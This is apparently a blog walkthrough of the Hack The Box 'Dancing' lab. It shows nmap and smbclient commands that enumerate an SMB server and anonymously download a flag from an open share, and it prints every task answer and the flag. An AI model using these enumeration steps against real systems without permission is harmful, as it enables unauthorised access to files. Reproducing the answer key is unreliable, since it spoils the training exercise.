---
weight: 4
title: "HTB Starting Point - Dancing"
date: '2026-07-08T03:00:02-07:00'
draft: false
author: "ic3sec"
authorLink: ""
description: "Writeup/Walkthrough for HTB Starting Point - Dancing"
images: []

tags: ["Writeup", "2026", "CTF", "HTB", "Hack the Box", "HTB Starting Point", "Walkthrough", "SMB", "smbclient", "Windows", "nmap", "HTB Very Easy"]
categories: ["Writeups", "CTF"]
---

## Overview
---
Part of the "starting point"  boxes on HTB, Dancing has a set of tasks with questions that provide a framework to walk through the machine. Dancing focuses on an open SMB share that we can grab the files of anonymously. As this machine is part of the “starting point” category, many of the tasks are fundamental knowledge questions - I highly recommend researching them a bit if you do not know the answer instead of copy/pasting.

|                  |               |
| ---------------- | ------------- |
| **Release Date** | 30 Sept, 2021 |
| **Difficulty**   | Very Easy     |
| **OS**           | Windows       |
| **Creator(s)**   | [HTB-Bot](https://app.hackthebox.com/users/16)       |

---

## Tasks

---

### Task 1
---
{{< admonition type=question open=true >}}
What does the 3-letter acronym SMB stand for?
{{< /admonition >}}

{{< admonition type=warning title=Answer open=false >}}
Server Message Block
{{< /admonition >}}

---

### Task 2
---
{{< admonition type=question open=true >}}
What port does SMB use to operate at?
{{< /admonition >}}

{{< admonition type=warning title=Answer open=false >}}
445
{{< /admonition >}}

---

### Task 3
---
{{< admonition type=question open=true >}}
What is the service name for port 445 that came up in our Nmap scan?
{{< /admonition >}}

As this box specifically mentions SMB on port 445, I can run a simple targeted nmap scan directly on that port to get a quick result:
```bash
[ice@parrot]─[~/Dancing]$ nmap -sV -p 445 10.129.129.200
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-08 05:43 EDT
Nmap scan report for 10.129.129.200
Host is up (0.075s latency).

PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?
```

{{< admonition type=warning title=Answer open=false >}}
microsoft-ds
{{< /admonition >}}

---

### Task 4
---
{{< admonition type=question open=true >}}
What is the 'flag' or 'switch' that we can use with the smbclient utility to 'list' the available SMB shares on Dancing?
{{< /admonition >}}

As per the [smbclient man page](https://linux.die.net/man/1/smbclient) --list or -L can be used to list the shares on an SMB server.

{{< admonition type=warning title=Answer open=false >}}
-L
{{< /admonition >}}

---

### Task 5
---
{{< admonition type=question open=true >}}
How many shares are there on Dancing?
{{< /admonition >}}

I can run `smbclient` with the flag from the last task to get an answer to this by counting the listed shares:
```bash
[ice@parrot]─[~/Dancing]$ smbclient -L //10.129.129.200
Password for [WORKGROUP\ice]:
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk      
```

{{< admonition type=warning title=Answer open=false >}}
4
{{< /admonition >}}

---

### Task 6
---
{{< admonition type=question open=true >}}
What is the name of the share we are able to access in the end with a blank password?
{{< /admonition >}}

Each share can be tested by using `smbclient //[client_ip]/[workshare]`, this is how it looks when authentication goes through successfully:
```bash
[ice@parrot]─[~/Dancing]$ smbclient //10.129.129.200/WorkShares
Password for [WORKGROUP\ice]:
Try "help" to get a list of possible commands.
smb: \> 
```

{{< admonition type=warning title=Answer open=false >}}
WorkShares
{{< /admonition >}}

---

### Task 7
---
{{< admonition type=question open=true >}}
What is the command we can use within the SMB shell to download the files we find?
{{< /admonition >}}

{{< admonition type=warning title=Answer open=false >}}
get
{{< /admonition >}}

---

### Submit Single Flag
---
I know what share we need to look in since the tasks above brought us to the `WorkShares` share, using `ls` I can see what folders/files are available:
```bash
smb: \> ls
  .                                   D        0  Mon Mar 29 04:22:01 2021
  ..                                  D        0  Mon Mar 29 04:22:01 2021
  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
  James.P                             D        0  Thu Jun  3 04:38:03 2021
```

Since there are only 2 directories it would be fairly simple to manually search through them, however I want to showcase a quick smbclient command functionality that can be used to recursively perform a command:

```bash
[ice@parrot]─[~/Dancing]$ smbclient //10.129.129.200/WorkShares -c "recurse; ls"
Password for [WORKGROUP\ice]:
  .                                   D        0  Mon Mar 29 04:22:01 2021
  ..                                  D        0  Mon Mar 29 04:22:01 2021
  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
  James.P                             D        0  Thu Jun  3 04:38:03 2021

\Amy.J
  .                                   D        0  Mon Mar 29 05:08:24 2021
  ..                                  D        0  Mon Mar 29 05:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 07:00:37 2021

\James.P
  .                                   D        0  Thu Jun  3 04:38:03 2021
  ..                                  D        0  Thu Jun  3 04:38:03 2021
  flag.txt                            A       32  Mon Mar 29 05:26:57 2021
```

And now that I know where `flag.txt` is, I can use my earlier smb client connection to `cd James.P\` and `get flag.txt` to pull it back to my machine, then exit the smbclient with `Ctrl+C` and `cat flag.txt` to finish up!

{{< admonition type=warning title=Flag open=false >}}
5f61c10dffbc77a704d76016a22f1664
{{< /admonition >}}

---

## Closing Thoughts
---
Dancing is another great introductory box that provides some basic knowledge on using SMB shares and why they need to be properly secured. Definitely don't want anyone going rummaging around in your files anonymously that you do not intend to see them!

---